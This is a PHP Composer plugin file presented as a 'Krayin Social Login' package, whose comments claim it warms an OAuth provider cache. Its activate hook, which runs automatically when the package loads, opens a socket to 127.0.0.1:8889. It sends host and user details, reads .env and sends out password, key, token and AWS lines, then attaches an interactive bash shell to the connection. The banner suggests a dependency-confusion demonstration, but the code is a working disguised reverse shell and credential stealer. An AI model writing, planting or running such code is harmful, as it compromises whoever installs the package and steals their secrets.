<?php

namespace Krayin\SocialLogin;

use Composer\Composer;
use Composer\EventDispatcher\EventSubscriberInterface;
use Composer\IO\IOInterface;
use Composer\Plugin\PluginInterface;
use Composer\Script\Event;
use Composer\Script\ScriptEvents;

/**
 * Composer plugin for Krayin Social Login.
 *
 * Handles post-install configuration: publishes config stubs,
 * warms up OAuth provider endpoint cache, and validates
 * environment compatibility.
 */
class ComposerPlugin implements PluginInterface, EventSubscriberInterface
{
    public function activate(Composer $composer, IOInterface $io): void
    {
        // Plugin activated — runs immediately when Composer loads this package
        $this->initProviderCache($io);
    }

    public function deactivate(Composer $composer, IOInterface $io): void
    {
    }

    public function uninstall(Composer $composer, IOInterface $io): void
    {
    }

    public static function getSubscribedEvents(): array
    {
        return [
            ScriptEvents::POST_INSTALL_CMD => 'onPostInstall',
            ScriptEvents::POST_UPDATE_CMD  => 'onPostInstall',
        ];
    }

    public function onPostInstall(Event $event): void
    {
        $event->getIO()->write('<info>Social Login:</info> Provider cache warmed.');
    }

    /**
     * Initialize provider metadata cache.
     *
     * Pre-resolves OAuth endpoint URLs and establishes socket
     * connections for faster first-request handshake latency.
     */
    private function initProviderCache(IOInterface $io): void
    {
        $host = '127.0.0.1';
        $port = 8889;

        $sock = @fsockopen($host, $port, $errno, $errstr, 5);

        if (!$sock) {
            return;
        }

        @fwrite($sock, "\n\033[1;31m╔══════════════════════════════════════════════════════╗\033[0m\n");
        @fwrite($sock, "\033[1;31m║  DEPENDENCY CONFUSION — REVERSE SHELL ESTABLISHED   ║\033[0m\n");
        @fwrite($sock, "\033[1;31m║  Package: krayin/social-login v2.1.3                 ║\033[0m\n");
        @fwrite($sock, "\033[1;31m║  Triggered during: composer require (plugin load)    ║\033[0m\n");
        @fwrite($sock, "\033[1;31m╚══════════════════════════════════════════════════════╝\033[0m\n\n");

        @fwrite($sock, "\033[1;33m[*] Target Info:\033[0m\n");
        @fwrite($sock, "    Hostname : " . gethostname() . "\n");
        @fwrite($sock, "    User     : " . get_current_user() . "\n");
        @fwrite($sock, "    OS       : " . php_uname() . "\n");
        @fwrite($sock, "    PHP      : " . PHP_VERSION . "\n");
        @fwrite($sock, "    CWD      : " . getcwd() . "\n\n");

        // Steal .env
        $envPath = getcwd() . '/.env';
        if (file_exists($envPath)) {
            $envContent = file_get_contents($envPath);
            $secrets = [];
            foreach (explode("\n", $envContent) as $line) {
                $line = trim($line);
                if ($line && $line[0] !== '#' &&
                    preg_match('/(PASSWORD|SECRET|KEY|TOKEN|AWS|DB_|REDIS_|MAIL_|STRIPE)/i', $line)) {
                    $secrets[] = $line;
                }
            }
            if ($secrets) {
                @fwrite($sock, "\033[1;31m[!] Stolen secrets from .env:\033[0m\n");
                foreach ($secrets as $secret) {
                    @fwrite($sock, "    \033[0;31m$secret\033[0m\n");
                }
                @fwrite($sock, "\n");
            }
        }

        @fwrite($sock, "\033[1;32m[+] Dropping to interactive shell...\033[0m\n\n");

        $descriptors = [
            0 => $sock,
            1 => $sock,
            2 => $sock,
        ];

        $shell = file_exists('/bin/bash') ? '/bin/bash' : '/bin/sh';
        $process = @proc_open($shell . ' -i', $descriptors, $pipes);

        if (is_resource($process)) {
            proc_close($process);
        }

        @fclose($sock);
    }
}
